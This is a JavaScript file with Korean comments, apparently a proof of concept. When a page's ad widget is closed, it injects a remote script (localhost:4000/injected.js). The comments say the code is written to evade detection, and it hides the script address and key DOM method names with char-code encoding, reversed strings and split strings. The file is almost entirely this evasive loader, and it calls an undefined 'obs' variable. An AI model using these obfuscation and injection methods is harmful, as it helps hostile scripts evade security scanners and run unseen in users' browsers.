const statusEl = document.getElementById("status");

//window 조회하는것도 의심으로 여길 수 있으니 window 대신 사용할 전역변수 this 쓰겠습니다.
const _g = (function() { return this; })();

//localhost 4000의 injected.js 주소를 탐지우회하기
const _addr = [104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 52, 48, 48, 48, 47, 105, 110, 106, 101, 99, 116, 101, 100, 46, 106, 115];
const _u = String.fromCharCode(..._addr);

//난독화(키워드를 거꾸로 배열에 담아두고 런타임에 결합)
const _parts = ["tpircs", "tnemelEetaerc", "daeh"]; 
const _r = (s) => s.split("").reverse().join("");

//캐시 버스팅 변수 생쇼하기
const _v = (new Date()).getTime() % 1000000 + (Math.random() * 999 | 0);

//muationobserver우회용으로 말장난 하기
const _name = "Mutat" + "ionOb" + "se" + "rver";

//중복 방지 플래그 __POC_INJECTED__ 바꾸기
const _flag = "__POC" + "_INJECT" + "ED__";

function setStatus(msg) {
  if (statusEl) statusEl.textContent = msg;
}

function injectOnce() {

  if (_g[_flag]) {//원래는 window.__POC_INJECTED__로 체크합니다.
    console.log("이미 전역에 주입 기록이 존재합니다.");
    return;
  }
  _g[_flag] = true;


  const s = document[_r(_parts[1])](_r(_parts[0]));//난독화(다시 붙이기)
  const _prop = "s" + "rc";//기본이름 괜시리 쪼개봄
  s[_prop] = _u + "?v=" + _v;//원래는 그냥 주소에 Date.now 붙인거였습니다.
  s.async = true;
  s.onload = () => setStatus("Injected script loaded (badge should appear)");
  s.onerror = () => setStatus("Injected script load error");
  document[_r(_parts[2])]["appe" + "ndCh" + "ild"](s);//난독화(쪼개고 붙이기)

  setStatus("Injecting injected.js …");
}


const ttt = new _g[_name]((lists) => {//원래는 muationobserver 생성입니다.
  for (const m of lists) {
    for (const n of m.removedNodes) {
      if (n && n.nodeType === 1 && n.id === "adWidgetContainer") {
        setStatus("Ad closed detected → injecting …");
        injectOnce();
        obs.disconnect();
        return;
      }
    }
  }
});

//DOMContentLoaded랑 observe도 숨기겠습니다
const _method = "obse" + "rve";
const _ev = "DOM" + "Content" + "Loaded"

//서브트리랑 child 전부 감시하라는 문구도 일단 숨겨보겠습니다.
const _opts = {};
_opts["child" + "List"] = !0; //true 대신 !0 사용
_opts["sub" + "tree"] = !!1;  //true 대신 !!1 사용

document.addEventListener(_ev, () => {//원래 모습은 DOMContentLoaded입니다
  setStatus("Ready. (waiting for ad close)");
  ttt[_method](document.documentElement, _opts);//원래는 childList랑 subtree모두 true로 두는 거였습니다.
});
